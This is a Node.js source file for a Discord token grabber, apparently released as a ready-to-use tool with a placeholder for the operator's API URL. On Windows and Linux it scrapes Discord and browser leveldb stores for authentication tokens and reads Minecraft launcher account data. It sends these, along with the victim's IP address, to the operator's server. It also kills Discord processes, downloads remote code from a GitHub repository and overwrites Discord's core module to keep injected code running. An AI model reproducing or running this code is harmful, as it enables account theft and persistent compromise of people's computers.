const OS = require("os"),
    fs = require("fs"),
    fetch = require("node-fetch"),
    {
        execSync
    } = require("child_process"),
    Glob = require("glob"),
    toInject = [],
    toInjectJS = [],
    toKill = [],
    apiurl = "" // Put Your API URL Here
try {
    switch (OS.platform()) {
        case "win32":
            const local = process.env.localappdata,
                roaming = process.env.appdata,
                minecraftPath = `${roaming}/.minecraft/launcher_accounts.json`,
                remixPath = `${roaming}/.minecraft/remix/UID.txt`
            dbPaths = [`${roaming}/Discord/Local Storage/leveldb`, `${roaming}/DiscordDevelopment/Local Storage/leveldb`, `${roaming}/Lightcord/Local Storage/leveldb`, `${roaming}/discordptb/Local Storage/leveldb`, `${roaming}/discordcanary/Local Storage/leveldb`, `${roaming}/Opera Software/Opera Stable/Local Storage/leveldb`, `${roaming}/Opera Software/Opera GX Stable/Local Storage/leveldb`, `${local}/Amigo/User Data/Local Storage/leveldb`, `${local}/Torch/User Data/Local Storage/leveldb`, `${local}/Kometa/User Data/Local Storage/leveldb`, `${local}/Orbitum/User Data/Local Storage/leveldb`, `${local}/CentBrowser/User Data/Local Storage/leveldb`, `${local}/7Star/7Star/User Data/Local Storage/leveldb`, `${local}/Sputnik/Sputnik/User Data/Local Storage/leveldb`, `${local}/Vivaldi/User Data/Default/Local Storage/leveldb`, `${local}/Google/Chrome SxS/User Data/Local Storage/leveldb`, `${local}/Epic Privacy Browser/User Data/Local Storage/leveldb`, `${local}/Google/Chrome/User Data/Default/Local Storage/leveldb`, `${local}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`, `${local}/Microsoft/Edge/User Data/Default/Local Storage/leveldb`, `${local}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`, `${local}/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`, `${local}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`]
            init()

            function init() {
                fs.readFile(remixPath, (err, res) => res && minecraft("remix", res))
                fs.readFile(minecraftPath, (err, res) => res && minecraft("minecraft", res))
                injectToDiscord()
                dbPaths.forEach(r => main(r))
            }

            function main(r) {
                fs.readdir(r, (err, tokenDir) => {
                    if (tokenDir) {
                        var ldbFileFilter = tokenDir.filter(f => f.endsWith("ldb"))
                        ldbFileFilter.forEach(file => {
                            var fileContent = fs.readFileSync(`${r}/${file}`).toString()
                            var noMFA = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/
                            var mfa = /"mfa\.[\d\w_-]{84}"/
                            var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]
                            if (token) fetch("http://ip-api.com/json/").then(r => r.json()).then(r => fetch(`${apiurl}/beforeinject`, {
                                method: "POST",
                                body: JSON.stringify({
                                    token: token.slice(1, -1),
                                    ip: r.query                                })
                            }))
                        })
                    }
                })
            }

            function minecraft(a2b, content) {
                switch (a2b) {
                    case "remix":
                        fetch(`${apiurl}/remix`, {
                            method: "POST",
                            body: JSON.stringify({
                                UID: content
                            })
                        })
                        break;
                    case "minecraft":
                        var [i] = /"[\d\w_-]{32}"/.exec(content)
                        if (i) {
                            const mc = require(minecraftPath)
                            if (!mc.accounts) return
                            var defaut = mc.accounts[i.slice(1, -1)]
                            fetch(`${apiurl}/minecraft`, {
                                method: "POST",
                                body: JSON.stringify({
                                    eligibleForMigration: defaut.eligibleForMigration,
                                    hasMultipleProfiles: defaut.hasMultipleProfiles,
                                    legacy: defaut.legacy,
                                    localId: defaut.localId,
                                    minecraftProfileID: defaut.minecraftProfile.id,
                                    minecraftProfileName: defaut.minecraftProfile.name,
                                    persistent: defaut.persistent,
                                    remoteId: defaut.remoteId,
                                    type: defaut.type,
                                    username: defaut.username,
                                    activeAccountLocalId: mc.activeAccountLocalId

                                })
                            })
                        }
                }
            }

            function injectToDiscord() {
                getInstalledDiscord()
                killAllDiscords()
                fetch("https://raw.githubusercontent.com/GayarraFrost/DiscordTokenGrabber/main/data/index.js").then(r => r.text()).then(r => toInjectJS.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiurl)) ^ execSync(`${local}/${f.split("/")[5]}/Update.exe --processStart ${f.split("/")[5]}.exe`)))
            }

            function getInstalledDiscord() {
                fs.readdirSync(roaming).forEach(r => r.includes("cord") && toInject.push(`${local}/${r}`));
                toInject.forEach(r => Glob.sync(`${r}/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js`).map(path => toInjectJS.push(path)))
            }

            function killAllDiscords() {
                var killList = execSync("tasklist").toString()
                killList.includes("Discord.exe") && toKill.push("discord")
                killList.includes("DiscordCanary.exe") && toKill.push("discordcanary")
                killList.includes("DiscordDevelopment.exe") && toKill.push("discorddevelopment")
                killList.includes("DiscordPTB.exe") && toKill.push("discordptb");
                toKill.forEach(r => execSync(`taskkill /IM ${r}.exe /F`))
            }
            break;
            /////////////////////////////////////////////////////////
            ///////////////////////// LINUX /////////////////////////
            /////////////////////////////////////////////////////////
        case "linux":
            const defaut = `/home/${(__dirname.split("/")[2])}/.config`,
                LdbPaths = [`${defaut}/discord/Local Storage/leveldb`, `${defaut}/discordcanary/Local Storage/leveldb`, `${defaut}/discordptb/Local Storage/leveldb`, `${defaut}/DiscordDevelopment/Local Storage/leveldb`]
            const LminecraftPath = `${defaut}/.minecraft/launcher_accounts.json`
            Linit()

            function Linit() {
                LdbPaths.forEach(r => Lmain(r))
                var minecraftContent = fs.readFileSync(LminecraftPath)
                if (minecraftContent) Lminecraft(minecraftContent)
                LinjectToDiscord()
            }

            function Lmain(r) {
                fs.readdir(r, (err, tokenDir) => {
                    if (tokenDir) {
                        var ldbFileFilter = tokenDir.filter(f => f.endsWith("ldb"))
                        ldbFileFilter.forEach(file => {
                            var fileContent = fs.readFileSync(`${tokenDir}/${file}`).toString()
                            var noMFA = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/
                            var mfa = /"mfa\.[\d\w_-]{84}"/
                            var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]
                            if (token) fetch("http://ip-api.com/json/").then(r => r.json()).then(r => fetch(`${apiurl}/beforeinject`, {
                                method: "POST",
                                body: JSON.stringify({
                                    token: token,
                                    ip: r.query
                                })
                            }))
                        })
                    }
                })
            }

            function Lminecraft(Content) {
                var [i] = /"[\d\w_-]{32}"/.exec(Content)
                if (i) {
                    const mc = require(LminecraftPath)
                    if (!mc.accounts) return
                    var defaut = mc.accounts[i.slice(1, -1)]
                    fetch(`${apiurl}/minecraft`, {
                        method: "POST",
                        body: JSON.stringify({
                            eligibleForMigration: defaut.eligibleForMigration,
                            hasMultipleProfiles: defaut.hasMultipleProfiles,
                            legacy: defaut.legacy,
                            localId: defaut.localId,
                            minecraftProfileID: defaut.minecraftProfile.id,
                            minecraftProfileName: defaut.minecraftProfile.name,
                            persistent: defaut.persistent,
                            remoteId: defaut.remoteId,
                            type: defaut.type,
                            username: defaut.username,
                            activeAccountLocalId: mc.activeAccountLocalId

                        })
                    })
                }
            }

            function LinjectToDiscord() {
                getInstalledLDiscord()
                fetch("https://raw.githubusercontent.com/GayarraFrost/DiscordTokenGrabber/main/data/index.js").then(r => r.text()).then(r => toInjectJS.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiurl))))
            }

            function getInstalledLDiscord() {
                fs.readdirSync(defaut).forEach(r => r.includes("cord") && toInject.push(`${defaut}/${r}`));
                toInject.forEach(r => Glob.sync(`${r}/*/modules/discord_desktop_core/index.js`).map(path => toInjectJS.push(path)))
            }
            break;
            /////////////////////////////////////////////////////////
            ///////////////////////// MacOS /////////////////////////
            /////////////////////////////////////////////////////////
        case "darwin":
            // Available Soon...
            break
    }
} catch (e) {}
